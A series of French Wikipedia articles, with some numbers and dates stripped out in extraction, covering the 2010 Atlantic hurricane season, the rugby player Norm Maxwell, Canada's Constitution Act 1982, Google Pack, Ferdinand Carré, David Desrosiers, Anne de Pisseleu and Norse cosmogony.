Le National Hurricane Center (NHC) a identifié une onde tropicale au-dessus du Sénégal le 29 juillet. Celle-ci s'est déplacée vers l'ouest, dans le flux de l'anticyclone subtropical tout en se développant. Le août, un centre de rotation est apparu alors que l'onde passait au sud des îles du Cap-Vert et tôt le 2 août, il devenait la dépression tropicale Quatre.
Vingt-quatre heures plus tard, la tempête tropicale Colin était née, se dirigeant rapidement vers l'ouest. Il s'agissait d'un système de petit diamètre, dont les vents de force de tempête ne s'étendait qu'à () de son centre, qui ne put s'intensifier car il passait dans une zone de fort cisaillement de vents en altitude. Le 3 août en après-midi, Colin était redevenue une dépression tropicale mais avait encore un certain potentiel de développement.
Colin se réorganisa tard le 4 août, en passant au nord-est des Petites Antilles, en un système de plus large diamètre et des bandes de précipitations convectives intenses. Cependant, il n'avait pas de centre de rotation fermé. Il a fallu attendre le 5 août pour qu'il reprenne le titre de tempête tropicale qui se dissipa après le 8 août.
Ouragan Danielle.
Le 19 août, une onde tropicale quitte la côte Ouest de l'Afrique. Se déplaçant dans des conditions favorables, sa circulation se ferme à l'approche des îles du Cap-Vert le 21 août, définissant la dépression tropicale Six. Le 22 août, cette dépression se développe en tempête tropicale dénommée "Danielle" vers UTC. Elle se trouvait alors à 13,4 N et 35,1 O, en plein océan Atlantique, et dirigeait vers le nord-ouest. Le lendemain, la dépression passe au statut d'ouragan de catégorie 2.
Le 24 août, Danielle s'affaiblit soudainement en catégorie 1. Plus tard dans le même jour, Danielle s'affaiblit brièvement en tempête tropicale, avant de devenir à nouveau en ouragan de catégorie 1. Quelques heures plus tard, Danielle se renforce de nouveau en catégorie 2 formant un œil, le 26 août. Le vendredi 27 août, l'ouragan Danielle était à au sud-est des Bermudes et le Centre américain des ouragans (NHC) a annoncé qu'il était devenu un ouragan majeur (catégorie 3) avec des vents atteignant . Il évolue en catégorie 4 au cours de la même journée.
L'ouragan ne demeure cependant pas longtemps à ce niveau et diminue rapidement vers la catégorie 3 puis 1, en se dirigeant vers les eaux plus froides au nord-est des Bermudes. Danielle a amorcé sa transition extratropicale le 31 août alors qu'elle passait au sud-est de Terre-Neuve sans jamais avoir approché de terres.
Ouragan Earl.
Une onde tropicale vigoureuse a quitté la côte africaine. Elle a rapidement développé un centre dépressionnaire fermé et bien organisée le 22 août autour d’un amas orageux. Le 24 août, l’organisation des bandes orageuses était très poussée et le National Hurricane Center américain a prédit que la zone avait 90 % de chance de se transformer en dépression tropicale au cours des 48 heures suivantes. La dépression tropicale "Sept" est effectivement apparue 18 heures plus tard à TUC le 25 août à , à l’ouest de l’île la plus au sud des îles du Cap-Vert. Six heures plus tard, les vents maximums soutenus atteignaient et le système a été reclassé tempête tropicale "Earl". Earl devait se diriger vers l’ouest tout en s’intensifiant dans une zone où le cisaillement des vents était faible et la température de surface de la mer très chaude. Cependant, de l’air sec dans le secteur empêchait un tel développement et les vents de Earl ont demeuré à durant 36 heures. La tempête s’est également retrouvée dans le sillon de l’ouragan Danielle le 27 août. Les vents sortant de celle-ci en altitude causaient un cisaillement défavorable, ce qui limita l’intensification d’Earl. Durant douze heures, les vents soutenus ne purent dépasser . Quand finalement Danielle s’est éloignée suffisamment, Earl a pu atteindre le niveau d’ouragan de catégorie 1 dans l’échelle de Saffir-Simpson le 30 août. Il est rapidement monté ensuite à la catégorie 4 vers le même jour. Le cyclone est redescendu à la catégorie 3 vingt-quatre heures plus tard, lors d’un remplacement de l’œil, mais ce ne fut que temporaire car il a atteint son maximum d'intensité un peu plus tard avec des vents soutenus de et des rafales à avant de redescendre à nouveau. Le 31 août 2010 en après-midi, Earl passait au nord de Porto Rico et se déplaçait vers l'ouest-nord-ouest, s'approchant de la lisière ouest de la crête subtropicale sur l'océan Atlantique. Cependant un creux barométrique provenant du continent promettait de modifier cette trajectoire plus vers le nord puis le nord-est. L'œil de l’ouragan était obscurci sur l'imagerie satellitaire, tant visible qu'infrarouge, en raison du cycle de remplacement du mur de l'œil. L'imagerie montrait du contenu en vapeur d'eau au nord-ouest d'Earl comportait une zone d'air sec rendant son intensification supplémentaire difficile.
Au cours de la nuit du 2 au 3 septembre, l'ouragan est passé à environ à l'est du cap Hatteras. Il était alors descendu à la catégorie 2 et se dirigeait vers des eaux plus froides ce qui allait l'affaiblir. À TUC ( HAE), il était retombé à la catégorie 1. En soirée, Earl est redevenu une tempête tropicale en s'approchant de l'île de Nantucket et du Cap Cod, alors que ses vents soutenus étaient tombés à environ . Il est passé à environ à l'est de Nanutcket durant la nuit avant de se diriger vers la pointe sud-ouest de la Nouvelle-Écosse au Canada.
Tempête tropicale Fiona.
Une zone de perturbation se déplace depuis la côte africaine durant la quatrième semaine du mois de septembre après l'ouragan Earl. Elle menace de se développer le 30 août, lorsqu'elle s'organise et se forme finalement en tempête tropicale Fiona, sautant ainsi le stade de dépression tropicale. Elle menace, cependant, de se développer encore plus. Elle se renforce brièvement en tempête tropicale avec des vents à , avant de s'affaiblir et de rétrograder en petite tempête tropicale. Pratiquement aucune convection atmosphérique n'est apparue sur radar, mais elle maintient malgré tout ses vents violents.
Tempête tropicale Gaston.
Une onde tropicale critique émerge de la côte ouest africaine durant le 28 août. Des données indiquent que cette neuvième dépression tropicale se développe à UTC le septembre, bien que le "National Hurricane Center" n'ait pu émettre efficacement ses alertes qu'à UTC le même jour 1500. Neuf heures plus tard, le "National Hurricane Center" le qualifie de dépression tropicale Neuf en tempête tropicale Gaston, mais il est révélé qu'elle reste tempête tropicale durant douze heures. Dans le rapport météorologique, le NHC note que Gaston pourrait ne pas attendre le stade de tempête tropicale.
Tempête tropicale Hermine.
Hermine se forme à partir des restes la dépression tropicale Onze dans la Baie de Campêche. La formation en dépression tropicale se fait au matin du 6 septembre. Plus tard, dans la matinée, le système est classé en tant que tempête tropicale et se nomme désormais Hermine. Plus tard, la tempête se renforce, et arrête de se renforcer durant l'après-midi et le soir. Hermine frappe le nord-est du Mexique, au sud de Matamoros (Tamaulipas), durant la soirée, en tant que forte tempête tropicale avec des vents à .
Des dégâts ont été rapportés dans la région de la vallée du Rio Grande, à la suite notamment de chutes d'arbres. Une femme se noie dans les crues à Jamaica Beach (Texas) aux États-Unis. Dans la soirée du 7 septembre, des alertes aux tornades ont été diffusées à Austin (Texas). À (CDT), le NHC diffuse sa dernière alerte concernant Hermine alors qu'elle rétrograde en dépression tropicale. Hermine s'affaiblit par étape et devient extratropicale lors de son passage en Oklahoma durant le 9 septembre. Les restes d'Hermine ont provoqué quelques fortes pluies et des tornades se sont formées. Elle se dissipe dans le Kansas le 10 septembre.
Ouragan Igor.
Une perturbation tropicale a rapidement formé une zone dépressionnaire en surface en quittant l’Afrique de l'Ouest le 6 septembre. Elle devint une dépression tropicale bien organisée le 8 septembre au matin et la neuvième tempête tropicale de la saison 2010, nommée Igor, au sud-est des îles du Cap-Vert. L’interaction avec une autre dépression tropicale et un cisaillement des vents d'est affaiblirent Igor le 9 septembre, et son déplacement devint presque nul. Elle redescendit au niveau de dépression tropicale tout en absorbant l'autre système. Le 10 septembre, Igor redevint tempête tropicale alors que la convection s'intensifia. Le 11 septembre, le système développa brièvement un œil durant deux heures, mais absorba de l'air sec des niveaux moyens de la troposphère ce qui fit diminuer la convection avant une nouvelle intensification qui le conduisit à devenir un ouragan tard ce jour-là. Le 12 septembre au matin, Igor développa un œil bien défini et dégagé, le tout entouré d'un mur compact de nuages. Il atteignit la catégorie 2 de l'échelle de Saffir-Simpson le matin et la catégorie 4 en après-midi en traversant l'Atlantique tropical. Ses vents passèrent ainsi de à en 8,5 heures tel qu'estimé par les images du satellite météorologique et la technique de Dvorak. L'intensification d'Igor continua à une allure plus lente en soirée avant de se stabiliser.
Ouragan Julia.
À la suite des autres ouragans capverdiens, la dépression tropicale Douze se forme le 12 septembre à partir d'une forte onde tropicale qui se développe proche des côtes africaines. Elle se renforce en tempête tropicale Julia au plus tôt du 13 septembre. Ce jour, la tempête tropicale Julia frappe les îles du Cap-Vert avec des vents violents. Elle est la deuxième tempête à frapper les îles du Cap-Vert en mois d'une semaine. Durant la nuit du 14 septembre, un œil cyclonique se développe, et Julia s'intensifie en ouragan. Contrairement à toutes les alertes émises anticipées, une intensification rapide débute le 15 septembre, et Julia se renforce en ouragan de catégorie 4, plus tôt dans la matinée, avec un pic d'intensité allant à .
Ouragan Karl.
Le 8 septembre, une onde tropicale entre en interaction avec une étendue de basse pression près des Îles du Vent, causant un développement orageux sur l'axe de l'onde tropicale et la formation d'une zone de basse pression. Après quelques jours, une dépression tropicale se forme dans la Mer des Caraïbes, à , le . Six heures plus tard, la dépression se renforça en tempête tropicale, nommée "Karl" par le NHC. Elle a continué de s'intensifier jusqu'au moment d'entrer dans les terres près de Rio Huach, à , le .
Malgré un affaiblissement du système, la structure de la tempête s'est considérablement améliorée, et celle-ci est ressortie des terres au-dessus des eaux chaudes de la Baie de Campêche, à le 16. À , un avion de reconnaissance confirma la présence d'un œil de forme elliptique d'environ de diamètre. Par la suite, dû aux conditions très favorable au développement, "Karl" atteignit le statut d'ouragan à le même jour. Par la suite, l'ouragan a entamé un virage vers l'ouest-sud-ouest tôt le .
Peu après , "Karl", toujours en intensification rapide, atteignit le stade d'ouragan majeur et, six heures plus tard, son pic d'intensité, avec des vents soutenus d'environ , à environ au nord-est de Veracruz, au Mexique. Par la suite, le cisaillement du vent commença à se renforcer et une injection d'air sec perça le mur de l'œil ouest de l'ouragan, causant l'affaiblissement du système juste avant de toucher terre, à environ au nord-ouest de Veracruz, à . Par la suite, le système s'affaiblit rapidement à cause de l'interaction avec les montagnes mexicaines, puis se dissipa à , le , à environ à l'ouest-sud-ouest de Veracruz.
Tempête tropicale Nicole.
Le matin du 25 septembre, le NHC a commencé à surveiller une zone orageuse désorganisée partiellement liés à la tempête tropicale "Matthew" dans le nord-ouest de la mer des Caraïbes. Les conditions environnementales semblaient favorables à un développement progressif puisqu'elle se déplaçait lentement vers le nord. Plus tard ce jour-là, la perturbation s'élargit et un faible creux de mousson se forma. Le système s'est progressivement organisé et développé en une dépression tropicale sur le nord-ouest de la mer des Caraïbes le 28 septembre.
Le système atteignit le statut de tempête tropicale le 29 septembre et fut nommé "Nicole". Elle fut cependant absorbée le 30 septembre par une dépression extratropicale qui s'est développée au large de la Floride et six heures plus tard, "Nicole" est devenue indiscernable de la dépression. Plus tard, cette dépression et l'humidité de "Nicole" touchèrent la côte est, juste au large de la côte de la Caroline du Sud puis la côte est du Canada, causant de graves inondations et quelques morts dans la région, avant de quitter vers l'Océan Atlantique le 4 octobre.
En raison de la structure atypique de "Nicole", les orages les plus puissants furent bien éloignés de son centre. La majeure partie de ses effets furent notés lieu sur le centre-nord de la mer des Caraïbes. En Jamaïque, la tempête a déclenché des pannes d'électricité généralisées pour plus de . Des précipitations extrêmes, allant jusqu'à , provoquèrent des inondations catastrophiques dans plusieurs paroisses, endommageant ou détruisant 528 maisons. La dévastation s'est étendue aux terres agricoles et à l'environnement de l'île, qui ont souffert d'une importante pollution de l'eau. Au total, Nicole a causé des dommages estimés à (2010) à la Jamaïque et seize décès. Ailleurs dans les Antilles, des inondations mineures se sont produites à Cuba, en Floride et dans les îles Caïmans.
Les restes de la tempête ont affecté la côte est des États-Unis, causant des dommages supplémentaires et des décès. Dans les États du Mid-Atlantic, l'événement a battu des records quotidiens de précipitations pour le 30 septembre à plusieurs endroits. Dans le Maryland, deux autobus se sont heurtés sous les orages, blessant 26 passagers. Avec des précipitations estimées localement à , plusieurs localités de l'État de New York ont battu des records pluviométriques. Des inondations dans l'État entraînèrent une noyade et environ en dommages. Des inondations considérables se sont également produites au Vermont et en Pennsylvanie, avec une accumulation maximale sur 24 heures de observée à Moscow (Pennsylvanie).
Plus au nord, les restes de la dépression ont accentué le gradient de pression sur le sud de la Nouvelle-Angleterre, générant des vents forts qui ont brisé les fils électriques dans le comté de Litchfield. Les pluies y ont en outre causé des inondations mineures. Au Québec, des torrents de pluie sont tombés le long et au sud de la vallée du Saint-Laurent, inondant des sous-sols et causant deux noyades. Malgré les décès et les dégâts, les pluies ont atténué la sécheresse prolongée dans ces régions.
Ouragan Otto.
Le 30 septembre, une grande zone orageuse associée à deux ondes tropicales s'est développée à l'est des Petites Antilles. Pendant plusieurs jours, elle s'est déplacée vers l'ouest-nord-ouest, se développant en dépression subtropicale "Dix-sept" le 6 octobre au nord-nord-ouest de San Juan (Porto Rico). Elle s'intensifia ensuite en tempête subtropicale et fut nommée "Otto" le 7 octobre.
Le 8 octobre, la tempête atteignit le statut d'ouragan mais le lendemain, "Otto" commença à affaiblir et à développer des bandes de nuages de type frontal pour devenir un système post-tropical le 10 octobre. Les restes d’"Otto" dérivèrent dans l'Océan Atlantique et se dissipèrent près du Portugal le 16 octobre.
Dérivant près de l'arc antillais pendant plusieurs jours, le précurseur d’"Otto" apporta des pluies prolongées aux îles du Vent, aux îles Vierges et à Porto Rico, déclenchant des inondations généralisées et de nombreux glissements de terrain. Les dégâts causés par la tempête - en particulier aux routes, aux biens et aux infrastructures - ont dépassé (2010), mais il n'y a pas eu de décès. Se dirigeant ensuite vers le nord-est sans toucher de terres, "Otto" et la dépression post-tropicale restante n'ont causé aucun dommage.

</doc>
<doc id="568794" url="https://fr.wikipedia.org/wiki?curid=568794" title="Norm Maxwell">
Norm Maxwell

Norman Michael Clifford Maxwell, né le à Rawene, est un joueur de rugby à XV néo-zélandais qui a joué 36 fois avec les All-Blacks de 1999 à 2004. Il joue au poste de deuxième ligne.
Carrière.
Il a joué avec l'équipe de Nouvelle-Zélande scolaire (1994), des moins de 19 ans (1995), des moins de 21 ans (1996-1997).
Maxwell a joué aussi avec l'équipe des Māori de Nouvelle-Zélande (1997-1998). En 1999, il a eu le titre de meilleur joueur māori de l’année.
Il a fait ses débuts avec les Blacks en à l’occasion d’un match contre l'équipe des Samoa. Il a cessé de jouer avec les Blacks en 2003, puis est revenu en 2004 (2 sélections). Il a disputé son dernier test match contre l'équipe de France en .
Il a disputé la Coupe du monde 1999 et a notamment marqué un essai contre Tonga.
Maxwell a joué avec les Barbarians britanniques en 2000 contre les Springboks.
Il joue dans le Super 12 avec les Canterbury Crusaders.
Statistiques.
En équipe nationale.
De 1999 à 2004, Norm Maxwell compte 36 sélections avec les "All-Blacks", inscrivant 25 points. Avec les "Kiwis", il dispute une Coupe du monde en 1999. Il participe à trois éditions du Tri-nations en 1999, 2000 et 2001.

</doc>
<doc id="568797" url="https://fr.wikipedia.org/wiki?curid=568797" title="Afoxé">
Afoxé

L’afoxé est un terme brésilien désignant :

</doc>
<doc id="568800" url="https://fr.wikipedia.org/wiki?curid=568800" title="Loi constitutionnelle de 1982">
Loi constitutionnelle de 1982

La Loi constitutionnelle de 1982 est l'un des deux textes fondamentaux de la Constitution du Canada. Elle a été adoptée par le Parlement du Royaume-Uni par la Loi de 1982 sur le Canada.
Cette loi comprend, entre autres choses : la Charte canadienne des droits et libertés et la procédure de modification de la Constitution du Canada, parachèvement le processus graduel initié au vingtième siècle connu comme le rapatriement de la Constitution du Canada. Son annexe formalise dans la constitution certains autres textes constitutionnels antérieurs comme la Loi constitutionnelle de 1867 et le Statut de Westminster de 1931.
Contexte.
Le Canada a acquis la majeure partie de son indépendance avant 1982 ; la Loi constitutionnelle de 1867 l'avait fondé et le Statut de Westminster de 1931 l'avait rendu souverain dans la quasi-totalité de ses domaines d'activités (affaires intérieures et extérieures, indépendance face au Parlement britannique, etc.). Le premier ministre du Canada de l'époque, Pierre Elliott Trudeau, a entrepris les démarches auprès du Parlement du Royaume-Uni afin d'achever le processus d'indépendance du Canada et de lui permettre de modifier lui-même sa constitution sans en faire la demande au Royaume-Uni. Ce processus est connu sous le nom de rapatriement de la Constitution du Canada.
En novembre 1981, Trudeau réunit tous les premiers ministres des provinces pour une rencontre de négociations constitutionnelles lors de la conférence constitutionnelle de la dernière chance. Les négociations se terminent par l'Accord constitutionnel du 5 novembre 1981 après la soirée du sans la participation du premier ministre du Québec de l'époque, René Lévesque. Cet événement, appelé par les indépendantistes québécois la nuit des longs couteaux, est à l'origine du fait que le Québec n'a jamais adhéré à la Constitution du Canada, sans toutefois que cela n'ait de conséquences juridiques.
Contenu.
Droits des peuples autochtones.
L'article 35 de la Loi constitutionnelle de 1982 « reconnaît et confirme » les « droits existants — ancestraux ou issus de traités — des peuples autochtones du Canada. » Ceci inclut les « Indiens, les Inuit et les Métis du Canada »
Le mot « existants » obligea la Cour suprême du Canada à définir quels droits autochtones existent. La Cour suprême du Canada a dit qu'avant 1982, les droits autochtones existaient en vertu du droit coutumier. Le droit coutumier pouvait être changé par une simple loi. Donc, avant 1982, le parlement fédéral pouvait éliminer des droits autochtones, tandis qu'il ne pouvait plus éliminer de droits qui existaient en 1982.
D'autres articles traitant des droits autochtones sont l'article 25 de la Charte et l'article 35.1 qui établissent les attentes pour une participation autochtone à la modification des dispositions constitutionnelles pertinentes.
Péréquation et égalité des chances.
L'article 36 enchâsse dans la Constitution l'égalité des chances pour la population canadienne, le développement économique pour soutenir cette égalité, et des services publics disponibles à la population. Le paragraphe 36(3) va plus loin en reconnaissant le « principe » voulant que le gouvernement fédéral doive assurer des paiements de péréquation.
En 1982, le professeur Peter Hogg exprima son scepticisme face à la possibilité pour les tribunaux d'interpréter et d'appliquer cette disposition, notant son caractère 
Modification de la Constitution du Canada.
Le paragraphe 52(3) de la Loi constitutionnelle de 1982 affirme que la Constitution du Canada peut seulement être modifiée conformément aux règles établies à l'intérieur même de la Constitution. Le but de ce paragraphe était de retirer aux législateurs le pouvoir de modifier la Constitution par une simple loi.
Les règles pour modifier la Constitution canadienne sont extrêmement denses. Elles sont décrites à la partie V de la Loi constitutionnelle de 1982.
Il existe cinq procédures de modification différentes, applicables à différents types de modification. Les cinq procédures sont les suivantes :
D'autres articles de la partie V décrivent des choses comme l’"opting out", où et comment une province peut se soustraire à une modification constitutionnelle, et les temps limites pour arriver à une modification constitutionnelle.
Suprématie.
Selon l'article 52 de la Loi constitutionnelle de 1982, , et toute loi qui la contredit est rendue inopérante. Ceci donne aux tribunaux canadiens le pouvoir d'annuler des lois. Bien que les lois demeurent par écrit jusqu'à ce qu'elles soient modifiées, après avoir été annulées, elles ne peuvent être appliquées.
Avant cette provision, l'Acte de l'Amérique du Nord britannique était la loi suprême du Canada en vertu de l'article 5 de la "", un statut impérial britannique déclarant qu'aucune loi coloniale violant un statut impérial n'était valide. Étant donné que l'Acte de l'Amérique du Nord britannique avait un statut impérial, toute loi canadienne violant l'AANB était inopérante. Il n'y avait aucune disposition prévue exprès pour donner aux tribunaux le pouvoir de juger qu'une loi canadienne violait l'AANB et était donc inopérante ; jusqu'en 1982, ce pouvoir de la cour faisait partie de la constitution non écrite du Canada.
Définition de la Constitution du Canada.
Le paragraphe 52(2) de la Loi constitutionnelle de 1982 définit la Constitution du Canada. La Constitution du Canada comprend :
Le paragraphe 52(2), en plus de comprendre dix-sept statuts impériaux écrits officiellement en anglais, contient sept lois canadiennes, dont trois créant des provinces, et quatre qui sont des modifications de la Loi constitutionnelle de 1867.
Les tribunaux canadiens se sont réservé le droit d'ajouter et d'enchâsser des principes et des conventions dans la Constitution de façon unilatérale. Bien que le droit des tribunaux de reconnaître des droits humains qui ne sont pas énoncés de façon explicite dans une constitution n'est pas particulièrement anormale, la situation canadienne est unique du fait que ce droit s'étend aux questions de procédures qui ne sont pas liées aux droits humains.
En particulier, la Cour suprême du Canada a dit que le paragraphe 52(2) ne constitue pas une liste exhaustive de tout ce que comprend la Constitution. La Cour se réserve le droit d'ajouter des principes non-écrits à la Constitution, et de ce fait les enchâsser en leur accordant la suprématie constitutionnelle (par exemple, ils ajoutèrent le privilège parlementaire à la Constitution). La Cour nota, par contre, que la liste de documents écrits était stagnante et ne pouvait être modifiée qu'à travers les formules d'amendement.

</doc>
<doc id="568808" url="https://fr.wikipedia.org/wiki?curid=568808" title="Google Pack">
Google Pack

Le Google Pack était une suite de logiciels proposée au téléchargement par Google comprenant à la fois des logiciels Google mais aussi des logiciels édités par ses partenaires. Google Pack est annoncé lors du Consumer Electronics Show le et lancé en version bêta. Disponible uniquement pour Windows XP, Windows Vista et Windows 7, il inclut un système permettant la mise à jour automatique du pack personnalisable appelé Google Updater.
En , Google a annoncé qu'il abandonnait ce projet.

</doc>
<doc id="568817" url="https://fr.wikipedia.org/wiki?curid=568817" title="Pays (France)">
Pays (France)



</doc>
<doc id="568820" url="https://fr.wikipedia.org/wiki?curid=568820" title="Liste des lignes du métro parisien">
Liste des lignes du métro parisien



</doc>
<doc id="568821" url="https://fr.wikipedia.org/wiki?curid=568821" title="Ferdinand Carré">
Ferdinand Carré

Philippe Ferdinand Édouard Carré, dit Ferdinand Carré, est un ingénieur français, né à Moislains, dans la Somme, le , et mort le à Pommeuse dans le département de Seine-et-Marne. Il s'est fait connaître pour avoir inventé des appareils frigorifiques destinés à produire de la glace pour les brasseries.
Inventions.
Philippe Ferdinand Édouard Carré naît le à Moislains, dans la Somme.
Il s'est fait connaître comme l'inventeur d'appareils frigorifiques destinés à produire de la glace pour les brasseries (Tourtel et Velten) et par ses travaux en électricité : un régulateur de lumière électrique ou encore une machine à influence qui porte son nom. 
En 1857, Ferdinand Carré invente le réfrigérateur à absorption. Ce système utilise l'eau comme absorbant et l'ammoniac comme réfrigérant. Il a donné son nom au cycle de Carré décrivant le procédé de réfrigération par absorption à deux fluides et deux niveaux de pression. 
Il fait breveter son invention aux États-Unis et la présente lors de l'Exposition universelle de 1862. Celle-ci n'eut pas de succès pour le marché domestique, mais trouva son succès dans les brasseries, pour maintenir les boissons au frais. Le réfrigérateur pouvait produire entre 12 et de glaces, selon les modèles.
Il est fait chevalier de la Légion d'honneur par décret du 24 janvier 1863.

</doc>
<doc id="568827" url="https://fr.wikipedia.org/wiki?curid=568827" title="David Desrosiers">
David Desrosiers

David Desrosiers né le à Sept-Îles, est un musicien, bassiste du groupe canadien jusqu’en .
Biographie.
Fils d'un couple divorcé, il a grandi avec sa sœur ainée Julie à Matane. David parle le français et l’anglais. Pendant son adolescence, il travaille dans un restaurant de la chaîne de restauration rapide McDonald's. Régulièrement, il part sur le pouce à Montréal ou à Québec pour aller voir ses groupes favoris en concert. Green Day, groupe duquel David tire beaucoup d'inspiration, est l'un d'eux. Après la fin de son secondaire, il part pour Los Angeles dans le but de percer dans le monde de la musique, là où il restera pendant 1 an. Malheureusement la chance n'étant pas de son côté, il revient au pays et il rejoint le groupe Reset, pour qui il deviendra chanteur et bassiste pendant quelques mois. Il remplace Pierre Bouvier qui a quitté le groupe pour retourner aux études. Plus tard Pierre Bouvier se joindra au groupe de Chuck Comeau qui s'appellera désormais Simple Plan.
Au sein de Reset, en plus de la guitare basse, David chante. Après quelque temps, les gars de Simple Plan (Chuck Comeau, Pierre Bouvier, Jeff Stinco et Sébastien Lefebvre) aperçoivent David dans un spectacle de Reset. Ils lui demandent de se joindre à Simple Plan. David accepte après quelques instants de réflexion. Dans Simple Plan, David joue de la guitare basse et chante les chœurs arrières avec Sébastien Lefebvre.
David joue également de l'harmonica, de la guitare, de la batterie et comme mentionné plus haut, il peut aussi chanter. Il remplace parfois Chuck Comeau pendant les spectacles, le batteur du groupe ou échange sa basse avec le guitariste Sébastien Lefebvre. Il joue aussi au piano. 
Il vit actuellement dans un appartement sur l'île de Montréal.
Il joue principalement sur des Fender Precision Bass.
Violences sexistes et sexuelles.
Dans la foulée d'un vaste mouvement de dénonciations sur les réseaux sociaux en juillet 2020, lié à des comportements répréhensibles envers les femmes, David Desrosiers décide de quitter Simple Plan et entame une thérapie.
Anecdote.
Dans le livre Le journal d'Aurélie Laflamme, la meilleure amie d'Aurélie, Kat est fan de lui.

</doc>
<doc id="568828" url="https://fr.wikipedia.org/wiki?curid=568828" title="Le Collège militaire royal de Saint-Jean">
Le Collège militaire royal de Saint-Jean



</doc>
<doc id="568830" url="https://fr.wikipedia.org/wiki?curid=568830" title="Anne de Pisseleu">
Anne de Pisseleu

Anne de Pisseleu, duchesse d'Étampes, née vers la fin de l'année 1508, au château de Fontaine-Lavaganne (Picardie), et morte dans les premiers jours de , au château d'Heilly (Picardie), est la favorite de , jusqu'à la mort du roi.
Biographie.
Famille.
Elle est issue de la famille Pisseleu d'Heilly, famille modeste mais de vieille noblesse picarde, fille d'Anne Sanguin (v.1479-v.1518), et de Guillaume de Pisseleu (v.1470-v.1526-29), châtelain d'Heilly ; nièce d'Antoine Sanguin de Meudon (1493-1559), cardinal, seigneur de Meudon qui lui lègue le château qu'il y avait fait construire, les seigneuries de Meudon, Angervilliers et Bures ; petite-fille d'Antoine Sanguin co-seigneur de Livry.
Ses débuts.
Elle fait ses débuts à la cour dans la suite de Marie de Luxembourg, duchesse douairière de Vendôme, puis elle devient fille d'honneur de Louise de Savoie, mère de , avant de devenir la maîtresse de ce dernier.
Favorite royale.
Elle avait dix-huit ans lorsque le roi trentenaire fait sa connaissance, au retour de sa captivité madrilène. Pour asseoir sa position à la cour, on lui fait épouser en 1532 un grand seigneur ruiné, de Brosse, qui reçoit le comté d'Étampes, que érige en duché en 1536. Mademoiselle d'Heilly devient ainsi duchesse d'Étampes.
En 1537, elle hérite de biens de son cousin germain Antoine Dubois, évêque de Béziers. Elle donne à cette occasion une tapisserie brodée de fontaines et de prophètes à la cathédrale Saint-Nazaire de Béziers.
La duchesse, dont l'intelligence est louée par ses flatteurs pour qui elle s’avère « la plus savante des belles et la plus belle des savantes », exerce une influence certaine sur le roi. Favorable à la guerre contre Charles Quint, elle pousse en 1541 le roi à disgracier le connétable de Montmorency, à la politique duquel son parti est opposé, et en 1545, elle en fait de même envers l'artiste Benvenuto Cellini.
À partir de 1539, avec la maladie de son influence à la cour décroît. Anne de Pisseleu se convertit au protestantisme alors que Diane de Poitiers, favorite du dauphin Henri, est ardente catholique. Avec sa sœur Madame de Canny, elle propage la doctrine de Calvin se mêlant aux intrigues et pendant la guerre civile de 1576 reçoit dans son château de Challuau les chefs protestants réunis en conférence.
Le , elle obtint du roi les terres des Clayes.
Disgrâce.
Après la mort de , en 1547, elle tombe en disgrâce, comme nombre des personnes de son entourage, victime d'une large révolution de palais voulue par dans les premiers jours de son règne - les relations entre le nouveau roi, sa propre favorite Diane de Poitiers et l'ancienne favorite de son père étant difficiles depuis longtemps se dégradent encore après l'épisode du coup de Jarnac. Selon la tradition, Anne de Pisseleu restitue les bijoux offerts par . Ses relations suspectes avec Charles Quint, notamment par le biais de Nicolas de Bossut, seigneur de Longueval, lui valent un procès et un bannissement.
Elle se retire sur ses terres auprès de son mari, et après la mort de celui-ci en 1564 elle réside au château d'Heilly où elle meurt dans la foi protestante, au début septembre 1580.
Postérité littéraire et cinématographique.
Littérature.
La duchesse d'Étampes est l'un des personnages du roman d'Alexandre Dumas, "Ascanio ou l'Orfèvre du roi" (1843).

</doc>
<doc id="568831" url="https://fr.wikipedia.org/wiki?curid=568831" title="Cosmogonie nordique">
Cosmogonie nordique

La cosmogonie nordique est le système de la création du Monde, selon la mythologie nordique.
Du néant originel aux premiers géants et aux premiers dieux.
Tel est le commencement des temps qui nous est présenté dans la Völuspá. Le néant originel, Ginnungagap ("vide béant" en vieux norrois) est bordé au nord par Niflheim, monde du froid et de la glace, du brouillard et de l’obscurité, au sud par Muspellheim, domaine du feu et des flammes, de la chaleur et de la lumière.
Au centre de Niflheim se trouve une source, Hvergelmir, d’où jaillissent onze rivières empoisonnées, les Élivágar. Loin de leur source, ces rivières gelèrent, et du givre apparut. Petit à petit, il gagna Ginnungagap. En même temps, un souffle d’air chaud venait de Muspellheim. Cette chaleur fit fondre le givre, et des gouttes se formèrent, donnant naissance au premier être, un géant du nom d'Ymir.
De la rencontre de la chaleur et du froid naquit également la vache Audhumla. De ses pis jaillissaient quatre rivières de lait, qui nourrirent Ymir.
Mais Audhumla ne joue pas seulement le rôle de « nourrice » d’Ymir. En effet, pour se nourrir, elle se mit à lécher les blocs de givre. Ce faisant, elle fit apparaître une chevelure le premier jour, une tête le deuxième jour, et, au troisième jour, ce fut un être tout entier, Buri qui se libéra des glaces.
Quant à Ymir, il engendre durant son sommeil deux « enfants ». Dans le même temps, l’un de ses pieds engendra avec l’autre pied un fils, Thrudgelmir, un géant à six têtes.
Buri eut, dans des conditions que l’on ignore, un fils nommé Burr ou Borr (ce qui signifie tout simplement « fils »). Les géants aussi se reproduisirent. En particulier, l’un d’eux, Bolthorn, eut une fille portant le nom de Bestla.
Burr et Bestla engendrèrent les premiers dieux : Odin, Vili et Vé.
Le meurtre d'Ymir et la création du Monde.
Arriva ensuite le jour où Odin, Vé et Vili tuèrent Ymir. Tous les géants se noyèrent dans son sang, sauf Bergelmir, fils de Thrudgelmir. Il parvint en effet à s’enfuir avec sa femme dans un tronc d'arbre évidé. C’est grâce à lui que se perpétua la race des géants du givre. Ce thème du meurtre des ancêtres se retrouve dans de nombreuses mythologies, notamment la mythologie grecque (titanomachie).
Une fois qu’ils eurent tué Ymir, les dieux transportèrent son corps au centre de Ginnungagap. Ils créèrent la terre avec sa chair, les mers et les lacs avec son sang, les montagnes avec ses os. De son crâne ils firent la voûte céleste, et de sa cervelle les nuages. Ses dents et les éclats de ses os devinrent les pierres et les rochers. Avec les sourcils d'Ymir fut construite une muraille destinée à se protéger des géants. Quant aux étoiles, les dieux les créèrent à partir des flammèches et des étincelles venues de Muspellheim. Les astres furent placés sur leur orbite, et c'est à partir de cette époque que l’on distingua le jour de la nuit.
Au cours du démembrement d'Ymir, les dieux découvrirent dans sa chair des êtres semblables à des vers. Ils décidèrent de les doter d’intelligence et de leur donner forme humaine, donnant ainsi naissance aux nains. Quatre d'entre eux, placés aux quatre coins de la voûte céleste, furent utilisés pour soutenir le ciel : Nordri, Sudri, Austri et Westri, qui donnèrent leurs noms aux points cardinaux.
Organisation de l'Univers.
